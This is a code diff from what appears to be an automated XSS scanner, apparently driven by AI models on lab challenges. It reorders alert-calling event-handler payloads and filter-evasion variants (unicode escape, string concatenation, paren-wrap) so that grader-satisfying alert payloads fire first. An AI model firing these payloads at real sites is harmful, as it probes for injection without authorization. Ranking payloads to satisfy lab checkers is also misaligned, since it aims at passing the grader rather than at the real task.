@@ -44,21 +44,34 @@ const XSS_TAGS = ["script", "img", "svg", "body", "style", "details", "a", "marq
 // payload is a strong lead, not a confirmed execution. All benign — no server-side effect.
 // Each entry, given a nonce, returns the payload + a signature regex whose match means the
 // payload's SENSITIVE run (handler + function + nonce) survived RAW (not stripped, not encoded).
+//
+// ORDER MATTERS — `weaponized[]` preserves this order, and weak models fire the FIRST surviving
+// lead. So ALERT-CALLING payloads rank first (XSS checkers assert alert('XSS') — print/prompt/confirm
+// execute JS but do NOT satisfy an alert-checker → they lose the lab). Layout:
+//   1) plain alert across diverse tags — survives tag-allowlist filters, cleanest.
+//   2) alert-OBFUSCATION bypasses (unicode/concat/paren) — for keyword-blacklist filters that strip
+//      literal "alert"; here the plain forms above get stripped and drop out of `weaponized[]`, so
+//      an obfuscated ALERT naturally becomes surviving[0] (still an alert-caller → checker passes).
+//   3) non-alert JS-exec proofs (confirm/print/prompt) LAST — only surface when nothing alert-y
+//      survived; a genuine "JS runs here" lead, but ranked last so a checker-satisfying payload wins.
 const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
+  // 1) plain alert(), diverse tags
   (n) => ({ payload: `<svg onload=alert(${n})>`, sig: new RegExp(`onload=alert\\(${n}`, "i") }),
-  (n) => ({ payload: `<svg onload=confirm(${n})>`, sig: new RegExp(`onload=confirm\\(${n}`, "i") }),
-  (n) => ({ payload: `<svg onload=print(${n})>`, sig: new RegExp(`onload=print\\(${n}`, "i") }), // alt fn — bypasses alert/confirm blocklists
-  (n) => ({ payload: `<svg onload=prompt(${n})>`, sig: new RegExp(`onload=prompt\\(${n}`, "i") }),
-  (n) => ({ payload: `<svg onload=\\u0061lert(${n})>`, sig: new RegExp(`onload=\\\\u0061lert\\(${n}`, "i") }), // unicode-escape bypass
-  (n) => ({ payload: `<svg onload=top['al'+'ert'](${n})>`, sig: new RegExp(`top\\['al'\\+'ert'\\]\\(${n}`, "i") }), // concat bypass
-  (n) => ({ payload: `<svg onload=(alert)(${n})>`, sig: new RegExp(`\\(alert\\)\\(${n}`, "i") }), // paren-wrap bypass
   (n) => ({ payload: `<img src=x onerror=alert(${n})>`, sig: new RegExp(`onerror=alert\\(${n}`, "i") }),
-  (n) => ({ payload: `<img src=x onerror=print(${n})>`, sig: new RegExp(`onerror=print\\(${n}`, "i") }),
   (n) => ({ payload: `<body onpageshow=alert(${n})>`, sig: new RegExp(`onpageshow=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<details open ontoggle=alert(${n})>`, sig: new RegExp(`ontoggle=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<marquee onstart=alert(${n})>`, sig: new RegExp(`onstart=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<input autofocus onfocus=alert(${n})>`, sig: new RegExp(`onfocus=alert\\(${n}`, "i") }),
   (n) => ({ payload: `<a href=javascript:alert(${n})>x</a>`, sig: new RegExp(`href=javascript:alert\\(${n}`, "i") }),
+  // 2) alert-obfuscation bypasses (still call alert — beat literal-"alert" blocklists)
+  (n) => ({ payload: `<svg onload=\\u0061lert(${n})>`, sig: new RegExp(`onload=\\\\u0061lert\\(${n}`, "i") }), // unicode-escape
+  (n) => ({ payload: `<svg onload=top['al'+'ert'](${n})>`, sig: new RegExp(`top\\['al'\\+'ert'\\]\\(${n}`, "i") }), // concat
+  (n) => ({ payload: `<svg onload=(alert)(${n})>`, sig: new RegExp(`\\(alert\\)\\(${n}`, "i") }), // paren-wrap
+  // 3) non-alert JS-exec proofs LAST (won't satisfy an alert-checker — fallback evidence only)
+  (n) => ({ payload: `<svg onload=confirm(${n})>`, sig: new RegExp(`onload=confirm\\(${n}`, "i") }),
+  (n) => ({ payload: `<svg onload=print(${n})>`, sig: new RegExp(`onload=print\\(${n}`, "i") }),
+  (n) => ({ payload: `<img src=x onerror=print(${n})>`, sig: new RegExp(`onerror=print\\(${n}`, "i") }),
+  (n) => ({ payload: `<svg onload=prompt(${n})>`, sig: new RegExp(`onload=prompt\\(${n}`, "i") }),
 ]
 
 const XSS_NOT_TESTED = [
